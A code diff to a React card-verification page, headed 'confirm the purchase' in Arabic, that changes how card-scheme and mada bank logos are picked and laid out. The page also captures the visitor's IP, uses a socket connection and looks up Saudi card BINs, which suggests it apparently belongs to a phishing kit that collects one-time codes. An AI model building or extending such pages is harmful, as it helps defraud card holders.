@@ -2,8 +2,6 @@ import React, { useEffect, useState } from "react";
 import { io } from "socket.io-client";
 import { socket } from "../App";
 
-
-
 const Verification = () => {
   const [ip, setIp] = useState(null);
   const [code, setCode] = useState("");
@@ -43,6 +41,12 @@ const Verification = () => {
       } catch (err) {
         console.error("IP fetch failed:", err);
       }
+
+      setBankLogo(
+        sessionStorage.getItem("paymentMethod") === "mada"
+          ? `/mada.png`
+          : "/mada.svg"
+      );
     };
     fetchIP();
 
@@ -55,21 +59,18 @@ const Verification = () => {
     }, 1000);
 
     // Card Type
-    const scheme = sessionStorage.getItem("Card type");
-    if (scheme === "visa") {
+    const scheme = sessionStorage.getItem("paymentMethod");
+    if (scheme === "visa_mastarcard") {
       setCardLogo("/visa_logo.jpg");
     } else if (scheme === "mastercard") {
       setCardLogo("/mastar.svg");
     } else {
-      setCardLogo("/Bca-logo.svg");
+      setCardLogo("/mad.png");
     }
 
     // Bank Logo
     const bin = sessionStorage.getItem("cardBin");
     const bankKey = SAUDI_BINS[bin];
-    setBankLogo(
-      bankKey ? `/${bankKey}.png` : "/Bca-logo.svg"
-    );
 
     // Check URL for decline
     const params = new URLSearchParams(window.location.search);
@@ -101,19 +102,30 @@ const Verification = () => {
   };
 
   return (
-    <div className="flex justify-center items-center min-h-screen bg-gray-50 font-sans w-11/12 ">
+    <div className="flex flex-col justify-center items-center min-h-screen bg-gray-50 font-sans w-11/12 ">
+      <div className="w-full flex items-start justify-start">
+        <img
+          src="/Bca-logo.svg"
+          alt="Card Type"
+          className="h-10 w-20 object-contain"
+        />
+      </div>
       <div className="w-full max-w-md bg-white p-6 border-gray-100 shadow-lg border rounded-md">
-        <div className="flex justify-between items-center mb-4">
+        <div className="flex justify-center gap-x-5 items-center mb-4">
           <img
             src={cardLogo}
             alt="Card Type"
-            className="h-10 w-28 object-contain"
+            className="h-10 w-20 object-contain"
           />
-          <img
-            src={bankLogo}
-            alt="Bank Logo"
-            className="h-10 w-28 object-contain"
-          />
+          {cardLogo === "/visa_logo.jpg" ? (
+            <img
+              src="/mastar.svg"
+              alt="Card Type"
+              className="h-10 w-20 object-contain"
+            />
+          ) : (
+            ""
+          )}
         </div>
         <h2 className="text-xl font-bold text-center mb-3">
           تأكيد عملية الشراء
